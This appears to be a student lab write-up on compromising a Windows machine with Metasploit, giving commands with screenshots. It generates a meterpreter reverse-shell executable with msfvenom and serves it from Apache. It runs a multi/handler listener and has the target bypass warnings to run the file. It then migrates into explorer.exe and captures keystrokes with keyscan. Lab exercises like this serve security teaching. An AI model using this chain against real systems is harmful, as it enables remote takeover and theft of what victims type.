# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

### PROGRAM:
Find the attackers ip address using ifconfig

## OUTPUT:
![1](https://github.com/lokeshrahulv/Compromising-windows-using-Metasploit/assets/118423842/fddfa419-a14c-4e0e-9ea3-943b340d980a)
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
![2](https://github.com/lokeshrahulv/Compromising-windows-using-Metasploit/assets/118423842/53b07ebf-dc09-43fb-8e66-ae725dba5e9a)
copy the fun.exe into the apache /var/www/html folder 
![3](https://github.com/lokeshrahulv/Compromising-windows-using-Metasploit/assets/118423842/03dc7ea8-43d2-4295-9854-820e3339303f)
Start apache server sudo systemctl apache2 start
![4](https://github.com/lokeshrahulv/Compromising-windows-using-Metasploit/assets/118423842/30201524-c0ad-48d4-915d-3938a4293903)
Check the status of apache2 
![5](https://github.com/lokeshrahulv/Compromising-windows-using-Metasploit/assets/118423842/5e8f9d41-9184-4d0b-8ff6-d485016a4f96)
Invoke msfconsole:
## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit 
## OUTPUT:
![6](https://github.com/lokeshrahulv/Compromising-windows-using-Metasploit/assets/118423842/dc92bdd3-fa0e-434a-8839-577f0604d439)
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads. 240483850-4cf82361-ac00-46ab-92a2-3f09592d98d5
![7](https://github.com/lokeshrahulv/Compromising-windows-using-Metasploit/assets/118423842/82e851cf-23c2-47c8-ad11-8700fdbb85b1)
Bypass any warning boxes, double-click the file, and allow it to run.
![8](https://github.com/lokeshrahulv/Compromising-windows-using-Metasploit/assets/118423842/e4c4116d-2775-4222-82d9-c08de21b5a3a)
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted 
![9](https://github.com/lokeshrahulv/Compromising-windows-using-Metasploit/assets/118423842/373332bd-4252-4016-81f9-db3ce1d8dbac)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name. 
![10](https://github.com/lokeshrahulv/Compromising-windows-using-Metasploit/assets/118423842/f78ec6f7-3e3f-4691-847b-156b2e16df32)
keyscan_dump Shows the keystrokes captured so far
![11](https://github.com/lokeshrahulv/Compromising-windows-using-Metasploit/assets/118423842/ba6684bb-658e-4d1d-9d26-a50b31849c67)
## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
